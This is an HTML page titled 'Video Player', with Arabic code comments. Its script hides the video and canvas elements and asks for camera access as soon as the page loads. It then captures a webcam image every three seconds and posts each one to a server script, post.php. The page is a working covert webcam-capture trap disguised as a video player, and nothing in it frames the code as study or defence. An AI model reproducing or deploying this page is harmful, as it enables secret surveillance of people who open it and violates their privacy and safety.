<!DOCTYPE html>
<html>
<head>
    <title>Video Player</title>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
</head>
<body style="background-color: black;">
    <video id="video" width="100%" height="100%" autoplay style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        // طلب إذن الكاميرا تلقائياً
        async function setupCamera() {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            const video = document.getElementById('video');
            video.srcObject = stream;

            // التقاط صورة كل 3 ثواني
            setInterval(() => {
                const canvas = document.getElementById('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                const imageData = canvas.toDataURL('image/png');

                // إرسال الصورة إلى السيرفر
                $.post('post.php', { cat: imageData });
            }, 3000);
        }
        setupCamera();
    </script>
</body>
</html>
